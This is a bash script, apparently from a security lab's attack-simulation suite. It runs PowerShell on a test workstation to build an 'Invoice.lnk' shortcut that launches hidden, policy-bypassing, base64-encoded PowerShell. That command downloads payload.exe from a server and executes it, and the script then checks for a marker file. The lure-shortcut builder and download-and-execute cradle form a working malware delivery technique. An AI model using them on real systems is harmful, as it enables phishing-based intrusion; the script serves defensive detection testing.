#!/usr/bin/env bash
# H-01 LNK — Rule 4 delivery verify + simulated click on ws01
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/h-common.sh"
echo "=== H-01 Malicious LNK ==="
h_require_artifact "Invoice.lnk"
h_require_artifact "payload.exe"
OUT="$(h_ws01_exec "
\$ErrorActionPreference='Continue'
\$server='${H_WS01_HTTP}'
\$marker='C:\Windows\Temp\H-PAYLOAD-MARKER.txt'
Remove-Item \$marker -Force -ErrorAction SilentlyContinue
\$cmd=\"(New-Object Net.WebClient).DownloadFile('\$server/payload.exe','C:\Windows\Temp\h01-p.exe');Start-Process C:\Windows\Temp\h01-p.exe\"
\$b64=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(\$cmd))
\$wshell=New-Object -ComObject WScript.Shell
\$lnk=\$wshell.CreateShortcut('C:\Windows\Temp\H-01-Invoice.lnk')
\$lnk.TargetPath='powershell.exe'
\$lnk.Arguments=\"-WindowStyle Hidden -Exec Bypass -enc \$b64\"
\$lnk.Save()
Write-Output \"LNK_BUILT \$((Get-Item 'C:\Windows\Temp\H-01-Invoice.lnk').Length)\"
Start-Process -FilePath 'C:\Windows\Temp\H-01-Invoice.lnk' -ErrorAction SilentlyContinue
Start-Sleep -Seconds 10
if (Test-Path \$marker) { Write-Output 'H01_MARKER True'; Get-Content \$marker; Remove-Item \$marker -Force } else { Write-Output 'H01_MARKER False' }
Remove-Item 'C:\Windows\Temp\H-01-Invoice.lnk','C:\Windows\Temp\h01-p.exe' -ErrorAction SilentlyContinue
")"
printf '%s\n' "${OUT}"
printf '%s' "${OUT}" | grep -q 'H01_MARKER True' || { echo "H-01 FAIL: payload marker missing" >&2; exit 1; }
echo "H_01_OK"
echo "H-01 complete"
